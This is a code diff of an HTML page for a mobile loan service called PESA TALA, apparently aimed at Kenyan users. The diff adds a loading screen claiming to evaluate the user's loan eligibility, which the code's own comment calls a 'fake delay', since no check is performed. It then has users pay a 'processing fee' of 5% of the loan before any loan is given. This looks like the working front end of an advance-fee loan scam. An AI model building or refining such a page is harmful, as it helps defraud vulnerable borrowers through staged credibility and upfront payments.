@@ -2,36 +2,49 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Loan Limit - PESA TALA</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    #loadingScreen {
+      animation: fadeOut 1s ease-in-out forwards;
+      animation-delay: 2.5s;
+    }
+    @keyframes fadeOut {
+      to { opacity: 0; visibility: hidden; }
+    }
+  </style>
 </head>
 <body class="bg-gradient-to-tr from-purple-900 via-purple-700 to-gray-200 min-h-screen p-4 text-purple-900 flex items-center justify-center">
 
-  <div class="bg-white/90 backdrop-blur-md max-w-sm w-full rounded-2xl shadow-2xl p-6 text-center">
+  <!-- Loading Screen -->
+  <div id="loadingScreen" class="fixed inset-0 z-50 flex flex-col items-center justify-center bg-purple-900 text-white text-center">
+    <div class="text-2xl font-bold mb-2">Please wait...</div>
+    <div class="text-sm">Requesting servers. Evaluating your loan eligibility and limit.</div>
+    <div class="mt-4 w-2/3 h-2 bg-purple-300 rounded-full overflow-hidden">
+      <div id="loadingBar" class="h-full bg-white animate-pulse w-1/3"></div>
+    </div>
+  </div>
+
+  <!-- Main Loan UI -->
+  <div id="loanContent" class="bg-white/90 backdrop-blur-md max-w-sm w-full rounded-2xl shadow-2xl p-6 text-center hidden">
     <img src="pesatala-logo.png" alt="Logo" class="w-16 h-16 mx-auto mb-4 rounded-full shadow" />
 
     <h2 class="text-xl font-bold mb-2">Loan Limit Check</h2>
-    <p class="text-sm text-gray-700 mb-4">Adjust your loan amount and fee below to continue.</p>
+    <p class="text-sm text-gray-700 mb-4">Your eligible loan limit is ready. Adjust your amount below.</p>
 
-    <!-- Loan Amount Slider -->
-    <div class="mb-6">
+    <div class="mb-4">
       <label class="block text-left font-medium text-sm mb-1">Loan Amount (Max: <span id="maxLimitText">...</span>)</label>
-      <input type="range" min="2500" max="7000" step="100" value="4000" id="loanSlider"
-             class="w-full accent-purple-700" oninput="updateSlider()">
+      <input type="range" min="2500" max="7000" step="100" value="4000" id="loanSlider" class="w-full accent-purple-700" oninput="updateSlider()">
       <div class="text-sm mt-1">Ksh <span id="loanAmountDisplay">...</span></div>
     </div>
 
-    <!-- Fee Slider -->
-    <div class="mb-6">
-      <label class="block text-left font-medium text-sm mb-1">Choose Processing Fee</label>
-      <input type="range" min="250" max="700" step="10" value="350" id="feeSlider"
-             class="w-full accent-purple-700" oninput="updateSlider()">
-      <div class="text-sm mt-1">Ksh <span id="processingFeeDisplay">...</span></div>
+    <div class="text-left text-sm mt-4 bg-purple-50 p-3 rounded-xl border border-purple-200">
+      <p><strong>Processing Fee:</strong> Ksh <span id="processingFeeDisplay">...</span></p>
+      <p class="text-gray-600 text-xs mt-1">Automatically calculated as 5% of loan amount.</p>
     </div>
 
-    <button onclick="saveAndShowPopup()" 
-      class="w-full bg-purple-700 hover:bg-purple-800 text-white font-semibold py-3 rounded-xl shadow-md transition">
+    <button onclick="saveAndShowPopup()" class="w-full bg-purple-700 hover:bg-purple-800 text-white font-semibold py-3 rounded-xl shadow-md transition mt-6">
       Continue
     </button>
   </div>
@@ -48,10 +61,9 @@
         Repayment period: <strong>14 days</strong>
       </p>
       <p class="text-xs text-gray-600 mb-4">
-        To proceed, <strong>HAKIKA R PROVISION</strong> requires you to make a one-time processing fee payment to your PESA TALA account.
+        Please make a one-time processing fee payment to your PESA TALA account.
       </p>
-      <button onclick="window.location.href='verification.html'" 
-        class="bg-purple-700 hover:bg-purple-800 text-white py-2 px-6 rounded-xl shadow-md transition">
+      <button onclick="window.location.href='verification.html'" class="bg-purple-700 hover:bg-purple-800 text-white py-2 px-6 rounded-xl shadow-md transition">
         Proceed to Payment
       </button>
     </div>
@@ -61,7 +73,6 @@
     const fullName = localStorage.getItem("fullName") || "John Doe";
 
     const loanSlider = document.getElementById("loanSlider");
-    const feeSlider = document.getElementById("feeSlider");
     const loanAmountDisplay = document.getElementById("loanAmountDisplay");
     const processingFeeDisplay = document.getElementById("processingFeeDisplay");
 
@@ -72,14 +83,14 @@
 
     function updateSlider() {
       const loanAmount = parseInt(loanSlider.value);
-      const feeAmount = parseInt(feeSlider.value);
+      const feeAmount = Math.round(loanAmount * 0.05);
       loanAmountDisplay.textContent = loanAmount.toLocaleString();
       processingFeeDisplay.textContent = feeAmount.toLocaleString();
     }
 
     function saveAndShowPopup() {
       const loan = parseInt(loanSlider.value);
-      const fee = parseInt(feeSlider.value);
+      const fee = Math.round(loan * 0.05);
 
       localStorage.setItem("loanAmount", loan);
       localStorage.setItem("processingFee", fee);
@@ -96,7 +107,13 @@
       document.getElementById("popupOverlay").classList.add("hidden");
     }
 
-    updateSlider(); // Initialize values
+    // Load after fake delay
+    setTimeout(() => {
+      document.getElementById("loadingScreen").style.display = "none";
+      document.getElementById("loanContent").classList.remove("hidden");
+      updateSlider();
+    }, 2800);
   </script>
+
 </body>
 </html>
